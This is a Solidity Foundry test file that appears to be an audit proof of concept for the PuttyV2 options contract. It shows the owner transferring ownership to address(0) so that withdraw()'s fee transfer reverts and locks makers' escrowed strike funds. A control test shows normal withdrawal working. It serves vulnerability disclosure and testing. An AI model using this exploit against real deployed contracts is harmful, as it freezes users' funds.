// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/PuttyV2.sol";
import "solmate/tokens/ERC20.sol";

/**
 * @title ExploitTest - Denial of Service via Fee Transfer Manipulation
 * @notice This PoC demonstrates how the contract owner can prevent users from withdrawing
 *         their escrowed strike funds by manipulating the fee transfer mechanism.
 * 
 * Attack Vector #1: Transfer ownership to zero address
 * - Most ERC20 tokens revert on transfers to address(0)
 * - When withdraw() tries to send fees to owner(), it reverts
 * - Users cannot withdraw their strike funds
 * 
 * Attack Vector #2: ERC777 token hook exploitation (demonstrated in separate test)
 * - Owner transfers ownership to malicious contract
 * - Malicious contract's tokensReceived() hook reverts
 * - Users cannot withdraw their strike funds
 */

// Mock ERC20 token that reverts on transfer to zero address (standard behavior)
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // Override transfer to explicitly revert on zero address (like OpenZeppelin)
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        return super.transferFrom(from, to, amount);
    }
}

// Mock WETH for testing
contract MockWETH is ERC20 {
    constructor() ERC20("Wrapped Ether", "WETH", 18) {}

    function deposit() external payable {
        _mint(msg.sender, msg.value);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ExploitTest is Test {
    PuttyV2 public putty;
    MockERC20 public baseAsset;
    MockWETH public weth;
    
    address public owner;
    address public maker;
    address public taker;
    
    uint256 constant STRIKE = 100 ether;
    uint256 constant PREMIUM = 1 ether;
    uint256 constant DURATION = 1 days;
    uint256 constant FEE = 10; // 1% fee (10/1000)
    
    function setUp() public {
        // Setup accounts
        owner = address(this);
        maker = makeAddr("maker");
        taker = makeAddr("taker");
        
        // Deploy mock tokens
        weth = new MockWETH();
        baseAsset = new MockERC20();
        
        // Deploy PuttyV2
        putty = new PuttyV2("https://putty.finance/", FEE, address(weth));
        
        // Mint tokens to participants
        baseAsset.mint(maker, 1000 ether);
        baseAsset.mint(taker, 1000 ether);
        
        // Approve PuttyV2 to spend tokens
        vm.prank(maker);
        baseAsset.approve(address(putty), type(uint256).max);
        
        vm.prank(taker);
        baseAsset.approve(address(putty), type(uint256).max);
    }
    
    /**
     * @notice Test demonstrating DoS attack via transferring ownership to zero address
     * 
     * Attack Flow:
     * 1. Maker creates a short put order (deposits strike into contract)
     * 2. Taker fills the order (becomes long position holder)
     * 3. Long position expires without being exercised
     * 4. Owner maliciously transfers ownership to address(0)
     * 5. Maker tries to withdraw their strike back
     * 6. Transaction reverts because fee transfer to address(0) fails
     * 7. Maker's funds are permanently locked
     */
    function testExploit_ZeroAddressDoS() public {
        // ===== STEP 1: Create and fill a short put order =====
        
        // Maker creates a short put order
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,      // Put option
            isLong: false,      // Short position (maker is selling the put)
            baseAsset: address(baseAsset),
            strike: STRIKE,
            premium: PREMIUM,
            duration: DURATION,
            expiration: block.timestamp + 1 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, orderHash); // Using private key 1 for maker
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Adjust maker address to match the signer
        address actualMaker = vm.addr(1);
        order.maker = actualMaker;
        
        // Give tokens to actual maker
        baseAsset.mint(actualMaker, 1000 ether);
        vm.prank(actualMaker);
        baseAsset.approve(address(putty), type(uint256).max);
        
        // Re-sign with correct maker
        orderHash = putty.hashOrder(order);
        (v, r, s) = vm.sign(1, orderHash);
        signature = abi.encodePacked(r, s, v);
        
        // Record maker's initial balance
        uint256 makerBalanceBefore = baseAsset.balanceOf(actualMaker);
        
        // Taker fills the order (becomes long position holder)
        vm.prank(taker);
        uint256[] memory emptyFloorTokenIds = new uint256[](0);
        putty.fillOrder(order, signature, emptyFloorTokenIds);
        
        // Verify strike was transferred from maker to contract
        assertEq(baseAsset.balanceOf(address(putty)), STRIKE, "Strike not deposited");
        assertEq(baseAsset.balanceOf(actualMaker), makerBalanceBefore - STRIKE + PREMIUM, "Maker balance incorrect");
        
        // ===== STEP 2: Let the option expire without exercise =====
        
        vm.warp(block.timestamp + DURATION + 1);
        
        // ===== STEP 3: ATTACK - Owner transfers ownership to zero address =====
        
        console.log("=== ATTACK: Owner transfers ownership to address(0) ===");
        putty.transferOwnership(address(0));
        assertEq(putty.owner(), address(0), "Ownership not transferred to zero address");
        
        // ===== STEP 4: Maker attempts to withdraw strike (should revert) =====
        
        console.log("=== Maker attempts to withdraw strike ===");
        
        // This should revert because:
        // 1. withdraw() tries to transfer fee to owner()
        // 2. owner() returns address(0)
        // 3. baseAsset.safeTransfer(address(0), feeAmount) reverts
        // 4. Maker cannot access their funds
        
        vm.prank(actualMaker);
        vm.expectRevert("ERC20: transfer to the zero address");
        putty.withdraw(order);
        
        // ===== VERIFY: Funds are permanently locked =====
        
        console.log("=== EXPLOIT SUCCESSFUL: Funds are locked ===");
        assertEq(baseAsset.balanceOf(address(putty)), STRIKE, "Strike still locked in contract");
        assertEq(baseAsset.balanceOf(actualMaker), makerBalanceBefore - STRIKE + PREMIUM, "Maker cannot withdraw");
        
        console.log("Strike amount locked:", STRIKE);
        console.log("Maker's funds stuck in contract");
    }
    
    /**
     * @notice Test demonstrating the vulnerability with a normal withdrawal flow
     * @dev This shows that withdrawal works correctly when owner is a valid address
     */
    function testNormalWithdrawal() public {
        // Create and fill a short put order
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,
            isLong: false,
            baseAsset: address(baseAsset),
            strike: STRIKE,
            premium: PREMIUM,
            duration: DURATION,
            expiration: block.timestamp + 1 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign and fill order
        address actualMaker = vm.addr(1);
        order.maker = actualMaker;
        baseAsset.mint(actualMaker, 1000 ether);
        vm.prank(actualMaker);
        baseAsset.approve(address(putty), type(uint256).max);
        
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        vm.prank(taker);
        uint256[] memory emptyFloorTokenIds = new uint256[](0);
        putty.fillOrder(order, signature, emptyFloorTokenIds);
        
        // Expire the option
        vm.warp(block.timestamp + DURATION + 1);
        
        // Normal withdrawal (owner is valid address)
        uint256 ownerBalanceBefore = baseAsset.balanceOf(owner);
        uint256 makerBalanceBefore = baseAsset.balanceOf(actualMaker);
        
        vm.prank(actualMaker);
        putty.withdraw(order);
        
        // Verify fee was sent to owner and remaining strike to maker
        uint256 expectedFee = (STRIKE * FEE) / 1000;
        assertEq(baseAsset.balanceOf(owner), ownerBalanceBefore + expectedFee, "Fee not sent to owner");
        assertEq(baseAsset.balanceOf(actualMaker), makerBalanceBefore + STRIKE - expectedFee, "Strike not sent to maker");
    }
}
